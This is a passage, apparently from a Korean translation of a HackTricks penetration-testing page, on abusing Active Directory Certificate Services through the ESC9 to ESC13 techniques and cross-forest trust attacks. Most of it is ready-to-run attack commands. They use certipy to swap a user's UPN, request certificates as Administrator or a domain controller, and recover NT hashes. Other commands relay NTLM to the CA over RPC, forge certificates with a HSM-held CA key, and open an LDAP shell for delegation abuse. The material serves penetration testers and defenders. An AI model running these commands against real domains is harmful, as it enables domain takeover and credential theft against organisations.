이후, 취약한 것으로 표시된 `ESC9` 인증서 템플릿이 `Jane`으로 요청됩니다:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
인증서의 `userPrincipalName`이 `Administrator`를 반영하며 “object SID”가 없는 것으로 기록됩니다.

`Jane`의 `userPrincipalName`은 원래의 `Jane@corp.local`로 되돌려집니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
발급된 인증서를 사용하여 인증을 시도하면 이제 `Administrator@corp.local`의 NT 해시가 생성됩니다. 인증서에 도메인 지정이 없기 때문에 명령에는 `-domain <domain>`이 포함되어야 합니다:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 약한 인증서 매핑 - ESC10

### 설명

도메인 컨트롤러의 두 레지스트리 키 값이 ESC10에 의해 언급됩니다:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 아래의 `CertificateMappingMethods`에 대한 기본 값은 `0x18` (`0x8 | 0x10`)이며, 이전에는 `0x1F`로 설정되어 있었습니다.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 아래의 `StrongCertificateBindingEnforcement`에 대한 기본 설정은 `1`이며, 이전에는 `0`이었습니다.

**사례 1**

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우.

**사례 2**

`CertificateMappingMethods`에 `UPN` 비트(`0x4`)가 포함된 경우.

### 남용 사례 1

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우, `GenericWrite` 권한을 가진 계정 A는 계정 B를 손상시키기 위해 악용될 수 있습니다.

예를 들어, `Jane@corp.local`에 대한 `GenericWrite` 권한을 가진 공격자는 `Administrator@corp.local`을 손상시키려 합니다. 이 절차는 ESC9와 유사하며, 모든 인증서 템플릿을 사용할 수 있게 합니다.

처음에 `Jane`의 해시는 Shadow Credentials를 사용하여 `GenericWrite`를 악용하여 검색됩니다.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
그 후, `Jane`의 `userPrincipalName`이 `Administrator`로 변경되며, 제약 조건 위반을 피하기 위해 `@corp.local` 부분이 의도적으로 생략됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
그에 따라 기본 `User` 템플릿을 사용하여 `Jane`으로 클라이언트 인증을 활성화하는 인증서가 요청됩니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 원래대로 되돌려집니다, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
획득한 인증서로 인증하면 `Administrator@corp.local`의 NT 해시가 생성되며, 인증서에 도메인 세부 정보가 없기 때문에 명령어에 도메인을 지정해야 합니다.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods`에 `UPN` 비트 플래그(`0x4`)가 포함된 경우, `GenericWrite` 권한을 가진 계정 A는 `userPrincipalName` 속성이 없는 모든 계정 B를 손상시킬 수 있으며, 여기에는 머신 계정과 내장 도메인 관리자 `Administrator`가 포함됩니다.

여기서 목표는 `Jane`의 해시를 Shadow Credentials를 통해 얻고 `GenericWrite`를 활용하여 `DC$@corp.local`을 손상시키는 것입니다.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`의 `userPrincipalName`은 `DC$@corp.local`로 설정됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
클라이언트 인증을 위한 인증서가 기본 `User` 템플릿을 사용하여 `Jane`으로 요청됩니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 이 과정 후 원래대로 되돌아갑니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel을 통해 인증하기 위해 Certipy의 `-ldap-shell` 옵션이 사용되며, 인증 성공은 `u:CORP\DC$`로 표시됩니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP 셸을 통해 `set_rbcd`와 같은 명령은 리소스 기반 제약 위임(Resource-Based Constrained Delegation, RBCD) 공격을 가능하게 하여 도메인 컨트롤러를 위험에 빠뜨릴 수 있습니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
이 취약점은 `userPrincipalName`이 없거나 `sAMAccountName`과 일치하지 않는 모든 사용자 계정에도 적용됩니다. 기본적으로 `Administrator@corp.local`은 LDAP 권한이 높고 기본적으로 `userPrincipalName`이 없기 때문에 주요 타겟이 됩니다.

## NTLM을 ICPR로 릴레이하기 - ESC11

### 설명

CA 서버가 `IF_ENFORCEENCRYPTICERTREQUEST`로 구성되지 않은 경우, RPC 서비스를 통해 서명 없이 NTLM 릴레이 공격을 수행할 수 있습니다. [여기에서 참조](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)합니다.

`certipy`를 사용하여 `Enforce Encryption for Requests`가 비활성화되어 있는지 열거할 수 있으며, certipy는 `ESC11` 취약점을 표시합니다.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 남용 시나리오

릴레이 서버를 설정해야 합니다:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
참고: 도메인 컨트롤러의 경우, DomainController에서 `-template`을 지정해야 합니다.

또는 [sploutchy의 impacket 포크](https://github.com/sploutchy/impacket)를 사용할 수 있습니다:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

관리자는 인증 기관을 "Yubico YubiHSM2"와 같은 외부 장치에 저장하도록 설정할 수 있습니다.

USB 장치가 CA 서버에 USB 포트를 통해 연결되거나 CA 서버가 가상 머신인 경우 USB 장치 서버가 필요하며, YubiHSM에서 키를 생성하고 활용하기 위해 인증 키(때때로 "비밀번호"라고도 함)가 필요합니다.

이 키/비밀번호는 레지스트리의 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`에 평문으로 저장됩니다.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

CA의 개인 키가 물리적 USB 장치에 저장되어 있을 때 쉘 접근을 얻으면 키를 복구할 수 있습니다.

먼저 CA 인증서를 얻어야 합니다(이는 공개적입니다) 그리고:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
마지막으로, certutil `-sign` 명령을 사용하여 CA 인증서와 해당 개인 키를 사용하여 새로운 임의의 인증서를 위조합니다.

## OID 그룹 링크 남용 - ESC13

### 설명

`msPKI-Certificate-Policy` 속성은 인증서 템플릿에 발급 정책을 추가할 수 있게 해줍니다. 정책을 발급하는 책임이 있는 `msPKI-Enterprise-Oid` 객체는 PKI OID 컨테이너의 구성 명명 컨텍스트(CN=OID,CN=Public Key Services,CN=Services)에서 발견할 수 있습니다. 이 객체의 `msDS-OIDToGroupLink` 속성을 사용하여 정책을 AD 그룹에 연결할 수 있으며, 이를 통해 시스템은 인증서를 제시하는 사용자가 마치 그룹의 구성원인 것처럼 권한을 부여할 수 있습니다. [여기에서 참조](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

다시 말해, 사용자가 인증서를 등록할 수 있는 권한이 있고 인증서가 OID 그룹에 연결되어 있을 때, 사용자는 이 그룹의 권한을 상속받을 수 있습니다.

OIDToGroupLink를 찾으려면 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)를 사용하세요.
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 남용 시나리오

사용자 권한을 찾아 `certipy find` 또는 `Certify.exe find /showAllPermissions`를 사용할 수 있습니다.

`John`이 `VulnerableTemplate`을 등록할 수 있는 권한이 있다면, 사용자는 `VulnerableGroup` 그룹의 권한을 상속받을 수 있습니다.

단지 템플릿을 지정하기만 하면 OIDToGroupLink 권한이 있는 인증서를 받을 수 있습니다.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 인증서를 통한 포리스트 타협 설명 (수동태)

### 손상된 CA에 의한 포리스트 신뢰 파괴

**교차 포리스트 등록**을 위한 구성은 상대적으로 간단하게 이루어집니다. **리소스 포리스트의 루트 CA 인증서**는 관리자가 **계정 포리스트에 게시**하고, **리소스 포리스트의 엔터프라이즈 CA** 인증서는 **각 계정 포리스트의 `NTAuthCertificates` 및 AIA 컨테이너에 추가**됩니다. 이를 명확히 하자면, 이 구성은 **리소스 포리스트의 CA가 PKI를 관리하는 모든 다른 포리스트에 대한 완전한 제어 권한**을 부여합니다. 만약 이 CA가 **공격자에 의해 손상된다면**, 리소스 및 계정 포리스트의 모든 사용자에 대한 인증서를 **그들이 위조할 수** 있어, 포리스트의 보안 경계를 깨뜨릴 수 있습니다.

### 외부 주체에게 부여된 등록 권한

다중 포리스트 환경에서는 **인증된 사용자 또는 외부 주체**(엔터프라이즈 CA가 속한 포리스트 외부의 사용자/그룹)에게 **등록 및 편집 권한**을 허용하는 인증서 템플릿을 **게시하는 엔터프라이즈 CA**에 대해 주의가 필요합니다.\
신뢰를 통해 인증이 이루어지면, **인증된 사용자 SID**가 AD에 의해 사용자의 토큰에 추가됩니다. 따라서 도메인에 **인증된 사용자 등록 권한을 허용하는 템플릿**이 있는 엔터프라이즈 CA가 존재한다면, **다른 포리스트의 사용자가 템플릿에 등록할 수** 있습니다. 마찬가지로, **템플릿에 의해 외부 주체에게 명시적으로 등록 권한이 부여된다면**, **교차 포리스트 접근 제어 관계가 생성되어**, 한 포리스트의 주체가 **다른 포리스트의 템플릿에 등록할 수** 있게 됩니다.

두 시나리오는 한 포리스트에서 다른 포리스트로의 **공격 표면 증가**로 이어집니다. 인증서 템플릿의 설정은 공격자가 외부 도메인에서 추가 권한을 얻기 위해 악용될 수 있습니다.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../../banners/hacktricks-training.md}}
